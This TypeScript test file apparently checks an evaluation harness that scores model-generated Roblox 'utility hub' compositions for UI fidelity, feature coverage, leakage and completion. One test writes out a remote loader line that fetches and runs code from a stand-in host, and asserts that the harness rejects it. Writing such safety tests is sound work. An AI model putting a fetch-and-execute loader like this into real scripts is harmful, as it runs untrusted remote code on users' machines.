import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { parseHubComposition } from "../../src/lib/hub-spec.ts";
import { evaluate, evaluateCandidate, inferenceMessages, leakageAudit, parseCandidates, parseCases, type Candidate, type EvaluationCase } from "./evaluate.ts";

const fixture = () => parseHubComposition(readFileSync(new URL("../../tests/fixtures/composed-utility-hub.json", import.meta.url), "utf8"));
const sampleCase = (): EvaluationCase => {
  const composition = fixture();
  const featureIds = ["walk-speed", "jump-power", "rejoin", "theme"];
  const contract = {
    fullHub: true, features: featureIds.map(id => ({ id, label: id, behavior: id, availability: "supported" as const, evidence: "Standard Roblox client APIs", interaction: true })),
    ui: { instructions: "Aurora Hub, 480x360 navy/cyan, Movement/Session/Settings tabs, rounded and draggable.", requiredText: ["Aurora Hub", "Movement", "Session", "Settings"] },
  };
  return { id: "held-out-1", split: "test", designFamily: "navy-top", actionFamily: "standard-utilities", messages: [
    { role: "system", content: "Compose a complete hub as JSON." }, { role: "user", content: JSON.stringify({ request: contract.ui.instructions, requirements: contract }) }, { role: "assistant", content: JSON.stringify(composition) },
  ], expected: { composition, contract, featureIds, ui: {} } };
};
const output = (record: EvaluationCase, variant: Candidate["variant"] = "base"): Candidate => ({ id: record.id, variant, output: JSON.stringify(record.expected.composition) });
const mutated = (mutate: (spec: ReturnType<typeof fixture>) => void) => {
  const record = sampleCase(), spec = fixture(); mutate(spec);
  return evaluateCandidate(record, { ...output(record), output: JSON.stringify(spec) }, "base");
};

test("complete reference passes static composition checks without executing model code", () => {
  const record = sampleCase();
  const report = evaluateCandidate(record, output(record), "base");
  assert.equal(report.passed, true); assert.equal(report.softScore, 1);
  assert.equal(report.features.length, 4); assert.ok(report.features.every(row => row.passed));
  assert.equal(report.costUsd, null); assert.equal(report.durationMs, null);
});

test("identical base and specialist output receives identical scores", () => {
  const record = sampleCase(), report = evaluate([record], [output(record), output(record, "specialist")]);
  assert.equal(report.variants.base.strictPassRate, report.variants.specialist.strictPassRate);
  assert.equal(report.variants.base.meanSoftScore, report.variants.specialist.meanSoftScore);
  assert.equal(report.comparison.specialistWins, 0); assert.equal(report.comparison.baseWins, 0);
  assert.equal(report.comparison.conclusion, "superiority-not-established");
  assert.ok(report.comparison.cautions.includes("Small evaluation set"));
});

test("dimensions, colors, title and navigation mutations fail requested UI", () => {
  for (const mutate of [
    (spec: ReturnType<typeof fixture>) => { spec.window.width += 1; },
    (spec: ReturnType<typeof fixture>) => { spec.window.palette.accent = [255, 0, 0]; },
    (spec: ReturnType<typeof fixture>) => { spec.window.title = "Different title"; },
    (spec: ReturnType<typeof fixture>) => { spec.window.navigation = "left"; },
    (spec: ReturnType<typeof fixture>) => { spec.pages.reverse(); },
  ]) {
    const result = mutated(mutate);
    assert.equal(result.passed, false); assert.equal(result.checks.find(check => check.id === "ui")?.passed, false);
  }
});

test("a single remaining functionality cannot pass a full hub", () => {
  const result = mutated(spec => { spec.pages[0].items.splice(1); spec.pages[1].items = []; spec.pages[2].items = []; });
  assert.equal(result.passed, false);
  assert.equal(result.features.filter(row => row.passed).length, 1);
  assert.equal(result.checks.find(check => check.id === "coverage")?.passed, false);
});

test("disabled supported features and falsely bound shell features fail", () => {
  const disabled = mutated(spec => { spec.pages[1].items = [{ id: "rejoin", featureIds: ["rejoin"], kind: "disabled", label: "Rejoin", reason: "Needs game profile: this utility was disabled." }]; });
  assert.equal(disabled.passed, false); assert.equal(disabled.features.find(row => row.id === "rejoin")?.passed, false);
  const shell = mutated(spec => { spec.window.featureIds = ["rejoin"]; spec.pages[1].items = []; });
  assert.equal(shell.passed, false); assert.equal(shell.checks.find(check => check.id === "coverage")?.passed, false);
});

test("French functional text fails while an exact user-chosen French title is preserved", () => {
  assert.equal(mutated(spec => { spec.window.closeLabel = "Fermer"; }).checks.find(check => check.id === "language")?.passed, false);
  const record = sampleCase(); record.expected.composition.window.title = "Mon Univers";
  record.expected.contract.ui.requiredText[0] = "Mon Univers";
  assert.equal(evaluateCandidate(record, output(record), "base").passed, true);
});

test("unrequested A7DEV identity fails and no title is accepted for an untitled request", () => {
  const branded = mutated(spec => { spec.window.title = "A7DEV"; });
  assert.equal(branded.checks.find(check => check.id === "identity")?.passed, false);
  const record = sampleCase(); record.expected.composition.window.title = "";
  record.expected.contract.ui.requiredText.shift();
  assert.equal(evaluateCandidate(record, output(record), "base").passed, true);
});

test("a print-only replacement and an unrelated standard action fail callback control checks", () => {
  const noop = mutated(spec => { spec.pages[1].items = [{ id: "rejoin", featureIds: ["rejoin"], kind: "button", label: "Rejoin", description: "Rejoin this place when clicked.", action: "custom", code: 'print("Rejoined")' }]; });
  assert.equal(noop.passed, false); assert.equal(noop.checks.find(check => check.id === "controls")?.passed, false);
  const unrelated = mutated(spec => { const item = spec.pages[1].items[0]; if (item.kind === "button") item.action = "close"; });
  assert.equal(unrelated.checks.find(check => check.id === "coverage")?.passed, false);
});

test("custom external loader and unmanaged connection remain rejection signals", () => {
  const result = mutated(spec => { spec.pages[1].items = [{ id: "rejoin", featureIds: ["rejoin"], kind: "button", label: "Rejoin", description: "", action: "custom", code: 'loadstring(game:HttpGet("https://example.invalid/loader"))()\nctx.player.CharacterAdded:Connect(function() end)' }]; });
  assert.equal(result.passed, false);
  assert.equal(result.checks.find(check => check.id === "safety-static")?.passed, false);
  assert.equal(result.checks.find(check => check.id === "lifecycle-static")?.passed, false);
});

test("control identifiers are not unfairly compared with reference implementation identifiers", () => {
  const result = mutated(spec => { spec.pages[0].items[0].id = "different-implementation-id"; });
  assert.equal(result.passed, true);
});

test("missing outputs and provider errors count as failed cases instead of disappearing", () => {
  const record = sampleCase(), report = evaluate([record], [output(record)]);
  assert.equal(report.variants.specialist.cases, 1); assert.equal(report.variants.specialist.strictPassRate, 0);
  assert.equal(report.variants.specialist.missingOutputs, 1);
  assert.equal(report.variants.specialist.usage.costUsd, null);
  assert.equal(evaluateCandidate(record, { ...output(record), error: "out of memory" }, "base").passed, false);
});

test("invalid JSON, empty outputs, duplicate IDs and unknown cases cannot be accepted", () => {
  const record = sampleCase();
  for (const text of ["", "{}", "not JSON", '{"window":{}'] ) assert.equal(evaluateCandidate(record, { ...output(record), output: text }, "base").passed, false);
  assert.throws(() => parseCandidates(JSON.stringify(output(record)) + "\n" + JSON.stringify(output(record))), /Duplicate/);
  assert.throws(() => evaluate([record], [{ ...output(record), id: "unknown" }]), /unknown/);
  assert.throws(() => parseCandidates('{"id":"x","variant":"specialist","output":"","durationMs":-1}'));
});

test("inference input excludes assistant answers and leakage detects prompts, answers and families", () => {
  const record = sampleCase(); assert.equal(inferenceMessages(record).length, 2);
  assert.ok(inferenceMessages(record).every(message => message.role !== "assistant"));
  const training = { ...sampleCase(), id: "train-1", split: "train" };
  const audit = leakageAudit([record], [training]); assert.equal(audit.status, "detected");
  assert.deepEqual(audit.evidence.prompt, [record.id]); assert.deepEqual(audit.evidence.answer, [record.id]);
  assert.deepEqual(audit.evidence.designFamily, [record.id]); assert.deepEqual(audit.evidence.actionFamily, [record.id]);
  assert.equal(leakageAudit([record]).status, "not-audited");
});

test("empty evaluation and leaked training cannot produce superiority claims", () => {
  const empty = evaluate([], []); assert.equal(empty.variants.base.strictPassRate, null); assert.equal(empty.comparison.strictPassRateDelta, null);
  assert.equal(empty.comparison.conclusion, "superiority-not-established");
  const record = sampleCase(); record.split = "train";
  const report = evaluate([record], [output(record), output(record, "specialist")], []);
  assert.equal(report.leakage.status, "detected"); assert.equal(report.comparison.conclusion, "superiority-not-established");
});

test("schema, golden reference and measured usage are validated before reporting", () => {
  const record = sampleCase(); assert.equal(parseCases(JSON.stringify(record))[0].id, record.id);
  const report = evaluate([record], [{ ...output(record), durationMs: 123, costUsd: 0, inputTokens: 12, outputTokens: 34 }, { ...output(record, "specialist"), durationMs: 456 }]);
  assert.equal(report.variants.base.latency.medianMs, 123); assert.equal(report.variants.base.usage.costUsd, 0);
  assert.equal(report.variants.specialist.usage.costUsd, null);
  record.expected.featureIds.push("wrong-id"); assert.throws(() => parseCases(JSON.stringify(record)), /inconsistent/);
});

test("EOS completion is retained and an exhausted decoding budget independently fails even valid JSON", () => {
  const record = sampleCase();
  const complete = parseCandidates(JSON.stringify({ ...output(record), stoppedWithEos: true }))[0];
  const exhausted = parseCandidates(JSON.stringify({ ...output(record, "specialist"), stoppedWithEos: false }))[0];
  assert.equal(complete.stoppedWithEos, true); assert.equal(exhausted.stoppedWithEos, false);
  const report = evaluate([record], [complete, exhausted]);
  assert.equal(report.variants.base.strictPassRate, 1); assert.equal(report.variants.specialist.strictPassRate, 0);
  assert.equal(report.variants.specialist.completion.budgetExhausted, 1);
  assert.equal(report.variants.specialist.checks["completion-budget"].failures, 1);
  assert.equal(report.variants.specialist.checks.ui.passes, 1);
  assert.equal(report.variants.specialist.features.completeCases, 1);
  assert.ok(report.comparison.cautions.some(text => text.includes("incomplete decoding")));
});

test("unknown EOS remains annotated while invalid JSON leaves UI unassessed rather than inventing a UI failure", () => {
  const record = sampleCase();
  const report = evaluate([record], [output(record), { ...output(record, "specialist"), output: '{"window":', stoppedWithEos: false }]);
  assert.equal(report.variants.base.completion.unknown, 1); assert.equal(report.variants.base.checks["completion-budget"].passes, 1);
  assert.equal(report.results.find(row => row.variant === "base")?.stoppedWithEos, null);
  assert.equal(report.variants.specialist.checks.schema.failures, 1);
  assert.equal(report.variants.specialist.checks.ui.evaluated, 0); assert.equal(report.variants.specialist.checks.ui.notEvaluated, 1);
  assert.equal(report.variants.specialist.checks.ui.failures, 0);
  assert.equal(report.variants.specialist.features.required, 4); assert.equal(report.variants.specialist.features.notAssessed, 4);
  assert.equal(report.variants.specialist.features.passRateOnRequired, 0);
  assert.ok(report.limitations.some(text => text.includes("does not compare APInex or OpenRouter")));
  assert.throws(() => parseCandidates(JSON.stringify({ ...output(record), stoppedWithEos: "false" })));
});

test("per-check and per-feature aggregates preserve both paired case denominators", () => {
  const record = sampleCase(), second = { ...sampleCase(), id: "held-out-2" };
  const dropped = fixture(); dropped.pages[1].items = [];
  const report = evaluate([record, second], [
    { ...output(record), stoppedWithEos: true }, { ...output(second), stoppedWithEos: true },
    { ...output(record, "specialist"), stoppedWithEos: true, output: JSON.stringify(dropped) },
  ]);
  assert.equal(report.variants.specialist.checks.coverage.cases, 2);
  assert.equal(report.variants.specialist.checks.coverage.evaluated, 1);
  assert.equal(report.variants.specialist.checks.coverage.failures, 1);
  assert.equal(report.variants.specialist.features.required, 8);
  assert.equal(report.variants.specialist.features.assessed, 4);
  assert.equal(report.variants.specialist.features.passes, 3);
  assert.equal(report.variants.specialist.features.failures, 1);
  assert.equal(report.variants.specialist.features.byId.rejoin.required, 2);
  assert.equal(report.variants.specialist.features.byId.rejoin.failures, 1);
  assert.equal(report.variants.specialist.features.byId.rejoin.notAssessed, 1);
  assert.equal(report.variants.base.features.completeCaseRate, 1);
});
